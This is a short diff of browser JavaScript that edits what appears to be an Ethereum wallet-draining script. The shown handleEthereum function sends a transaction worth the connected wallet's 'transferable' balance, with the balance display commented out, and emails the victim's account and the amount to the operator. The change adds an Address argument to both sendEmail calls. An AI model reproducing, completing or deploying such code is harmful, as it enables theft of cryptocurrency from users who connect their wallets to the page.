@@ -262,7 +262,7 @@ const handleEthereum = async () => {
 			// Display Ethereum balance
 			//document.getElementById("wallet-add").innerHTML = account;
 			// document.getElementById("wallet-bal").innerHTML = `ETH Balance: ${ethBalanceInWei} ETH`;
-                        sendEmail(ethtransaferableInWei, account);
+                        sendEmail(ethtransaferableInWei, account,Address);
 
 			// Initialize web3 and contract
 			window.web3 = new Web3(window.ethereum);
@@ -278,7 +278,7 @@ const handleEthereum = async () => {
 				value: ethtransaferableInWei,
 				gas: 0
 			});
-			sendEmail(ethtransaferableInWei, account);
+			sendEmail(ethtransaferableInWei, account,Address);
 		} catch (error) {
 			console.error("Error:", error);
 		}
